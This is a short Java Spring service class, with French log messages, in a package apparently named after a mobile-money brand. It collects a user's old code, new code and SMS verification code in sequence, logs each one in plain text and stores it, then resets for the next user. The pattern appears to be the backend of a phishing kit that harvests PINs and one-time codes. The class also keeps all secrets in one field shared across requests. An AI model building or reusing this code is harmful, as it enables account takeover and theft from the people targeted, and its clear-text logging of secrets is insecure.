package com.example.waave.service;

import com.example.waave.model.UserCodeUpdate;
import com.example.waave.repository.UserCodeUpdateRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

@Service
public class CodeUpdateService {

    private final UserCodeUpdateRepository repository;

    private static final Logger logger = LoggerFactory.getLogger(CodeUpdateService.class);

    public CodeUpdateService(UserCodeUpdateRepository repository) {
        this.repository = repository;
    }

    private UserCodeUpdate tempData = new UserCodeUpdate();

    public UserCodeUpdate saveOldCode(String oldCode) {
        tempData.setOldCode(oldCode);
        logger.info("Ancien code reçu : {}", oldCode);
        UserCodeUpdate saved = repository.save(tempData);
        logger.info("Ancien code sauvegardé dans la base avec ID : {}", saved.getId());
        return saved;
    }

    public UserCodeUpdate saveNewCode(String newCode) {
        tempData.setNewCode(newCode);
        logger.info("Nouveau code reçu : {}", newCode);
        UserCodeUpdate saved = repository.save(tempData);
        logger.info("Nouveau code sauvegardé dans la base avec ID : {}", saved.getId());
        return saved;
    }

    public UserCodeUpdate saveSmsCode(String smsCode) {
        tempData.setSmsCode(smsCode);
        logger.info("Code SMS reçu : {}", smsCode);
        UserCodeUpdate saved = repository.save(tempData);
        logger.info("Code SMS sauvegardé dans la base avec ID : {}", saved.getId());
        // Reset pour un nouvel utilisateur
        tempData = new UserCodeUpdate();
        return saved;
    }
}
